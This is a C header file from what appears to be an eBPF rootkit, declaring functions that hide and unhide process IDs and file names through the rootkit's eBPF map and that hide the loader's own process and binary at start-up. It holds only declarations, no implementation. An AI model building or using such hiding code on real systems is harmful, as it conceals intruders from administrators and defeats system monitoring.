#ifndef __HIDER_H
#define __HIDER_H

#include <bpf/libbpf.h>
#include "config.h"
#include "rootkit.skel.h"

/**
 * @brief Initialize hider with rootkit eBPF skeleton.
 * 
 * @param skel Rootkit eBPF skeleton.
 * @return int 
 */
int hider_init(struct rootkit *skel);

/**
 * @brief Loads a PID to the rootkit's map to hide it.
 * 
 * @param pid 
 * @return int 
 */
int hider_hide_pid(pid_t pid);

/**
 * @brief Loads a file name to the rootkit's map to hide it.
 * 
 * @param filename 
 * @return int 
 */
int hider_hide_file(const char *filename);

/**
 * @brief Removes a PID from the rootkit's map to unhide it.
 * 
 * @param pid 
 * @return int 
 */
int hider_unhide_pid(pid_t pid);

/**
 * @brief Removes a file name from the rootkit's map to unhide it.
 * 
 * @param filename 
 * @return int 
 */
int hider_unhide_file(const char *filename);

/**
 * @brief Set the initail hide state of the rootkit.
 * 
 * It sets the loader PID and the loader's elf file to hide.
 * 
 * @return int 
 */
int hider_set_initial_hide_state();

#endif /* __HIDER_H */
